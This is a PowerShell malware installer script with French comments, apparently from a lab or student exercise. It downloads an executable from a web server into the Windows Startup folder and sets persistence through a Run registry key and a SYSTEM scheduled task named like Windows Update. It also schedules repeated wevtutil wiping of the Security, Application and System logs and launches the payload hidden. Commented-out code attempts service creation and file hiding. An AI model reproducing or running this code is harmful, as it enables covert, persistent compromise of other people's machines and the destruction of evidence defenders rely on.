$installPath = "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
$malwareExe = "$installPath\mechantmechant.exe"
$malwareExeRegedit = '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mechantmechant.exe" /background'
$logCleanupScriptPath = "$installPath\logs_cleanup.ps1"
$leServeurWeb = "10.0.2.15:80/malware"

Invoke-WebRequest -Uri $leServeurWeb -OutFile %appdata%\Microsoft\Windows\Start Menu\Programs\Startup

# Assurer l'existence du malware
if (!(Test-Path -Path $malwareExe)) {
    # Ligne de debug qu'on va évidemment supprimer en prod
    Write-Output "Erreur : Le fichier mechantmechant.exe est introuvable dans $installPath."
    exit
}

# Création du script de nettoyage des logs (cl = clear logs)
@"
wevtutil cl Security 
wevtutil cl Application
wevtutil cl System
"@ | Out-File -FilePath $logCleanupScriptPath -Encoding UTF8

#Création du service Windows pour exécuter le malware (ne marchait pas mais il y a peut-être quelque chose à faire avec)
#$serviceName = "WindowsUpdateMalware"
#$displayName = "Service Windows Malware"
#$description = "Service de mise à jour automatique du système"

# Supprime le service s'il existe déjà
#sc.exe delete $serviceName | Out-Null
#Start-Sleep -Seconds 2

#ancienne version  mais le service demarrait pas
#sc.exe create $serviceName binPath= $malwareExe DisplayName= $displayName start= auto
#sc.exe description $serviceName $description
#sc.exe start $serviceName
#New-Service -Name $serviceName -BinaryPathName $malwareExe -DisplayName $displayName -Description $description -StartupType Automatic
#Start-Service -Name $serviceName -ErrorAction SilentlyContinue
#if ((Get-Service -Name $serviceName).Status -ne 'Running') {
#    Write-Output "Erreur : Le service $serviceName n'a pas pu démarrer."
#} else {
#    Write-Output "Le service $serviceName a démarré avec succès."
#}

# Ajout d'une entrée dans le registre pour exécuter le malware au démarrage (pour une meilleure obfuscation on aurait pu usurper une clef qui existe déjà)
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" # le registre "Current User" demande moins de droits que "Local Machine"
$valueName = "WindowsUpdateMalwareValueName"
Set-ItemProperty -Path $registryPath -Name $valueName -Value $malwareExeRegedit

# Création d'une tâche planifiée pour redondance de l'exécution du malware
$taskName = "WindowsUpdateCheckerMalware"
$action = New-ScheduledTaskAction -Execute $malwareExe
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest #Pour l'executer avec le compte SYSTEM

# Supprime la tâche planifiée si elle existe déjà
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}
# Puis créé la tâche planifiée
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Description "Vérification de mise à jour du système"

# Création d'une tâche de nettoyage récurrent des logs
$cleanupTaskName = "LogCleanupTaskMalware"
$cleanupAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$logCleanupScriptPath`""
# la tâche se déroule toutes les 15min pendant 1 an (on avait des erreurs avec des valeurs trop grandes)
$cleanupTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(15) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365)

# Supprime la tâche de nettoyage si elle existe déjà
if (Get-ScheduledTask -TaskName $cleanupTaskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $cleanupTaskName -Confirm:$false
}
# Puis créé la tâche
Register-ScheduledTask -Action $cleanupAction -Trigger $cleanupTrigger -Principal $principal -TaskName $cleanupTaskName -Description "Nettoyage méchant des logs système"

#Masquer les dossiers/fichiers
#Get-Item $installPath | ForEach-Object { $_.Attributes = 'Hidden' }
#Get-Item $malwareExe | ForEach-Object { $_.Attributes = 'Hidden, System' }
#Get-Item $logCleanupScriptPath | ForEach-Object { $_.Attributes = 'Hidden, System' }

#Première execution du malware et du script de nettoyage de logs
Start-Process -FilePath $malwareExe -WindowStyle Hidden
Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$logCleanupScriptPath`"" -WindowStyle Hidden

# Ligne de debug qu'on va évidemment supprimer en prod
Write-Output "Installation et configuration terminées avec succès."